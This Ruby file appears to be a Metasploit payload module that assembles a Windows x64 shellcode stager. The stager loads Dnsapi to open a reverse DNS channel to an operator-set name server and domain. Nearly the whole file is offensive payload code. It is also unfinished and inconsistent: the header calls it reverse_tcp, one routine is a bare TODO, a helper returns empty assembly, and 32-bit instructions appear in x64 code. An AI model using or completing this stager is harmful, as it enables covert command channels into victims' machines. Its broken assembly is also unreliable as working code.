# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_x64
#
###

module Payload::Windows::ReverseDns_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID_x64
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ns_server:   ds['NS_SERVER'],
      domain:      ds['DOMAIN'],
      server_id:   ds['SERVER_ID'],
      retry_count: ds['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = ds['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_dns(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_dns(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_dns(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      #{asm_functions_dns()}
      
      start:
        pop rbp     
      #{asm_reverse_dns(opts)}
      
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
    space += 29

    # Reliability adds some bytes!
    space += 44

    #space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Integer] :retry_count Number of retry attempts
  #
  def asm_reverse_dns(opts={})

    retry_count  = [opts[:retry_count].to_i, 1000].max
    domain       = "#{opts[:server_id]}.#{opts[:domain]}"    
    ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
    domain_length= domain.length + 18
    
    alloc_stack  = (domain_length) + (4 - (domain_length %4))
    reliable     = opts[:reliable]
    
    asm = %Q^
    
         ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         push        'pi'               ; Push the bytes 'Dnsapi',0,0 onto the stack.
         push        'Dnsa'             ; ...
         push        esp                ; Push a pointer to the "Dnsapi" string on the stack.
         xor rbx, rbx
         push rbx                      ; stack alignment
         mov r14, 'Dnsapi'
         push r14                      ; Push 'Dnsapi',0 onto the stack
         mov rcx, rsp                  ; lpFileName (stackpointer)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call        rbp                ; LoadLibraryA( "Dnsapi" )
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         call         get_eip
        
        get_eip:
         pop           rax
         jmp           start_code
      
        hostname:
         db "7812.000g.0000.0.#{domain}", 0x00
        
        ;;;;;;;;;;; INCREMENT DOMAIN
        increment:
    
            ;;TODO
            
        start_code:
        ;;;;;;;;; INIT VARS in stack
      
      
    ^

    if reliable
      if opts[:exitfunk]
        asm << %Q^
          exit_func:
        ^
        asm << asm_exitfunk(opts)
      else
        asm << %Q^
          exit_func:
            push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
            call ebp
        ^
      end
    else
      asm << %Q^
          exit_func:
          
      ^
    end

    asm
  end
  
  
  def asm_functions_dns()
  
    asm = %Q^

    ^
    asm
  end

end
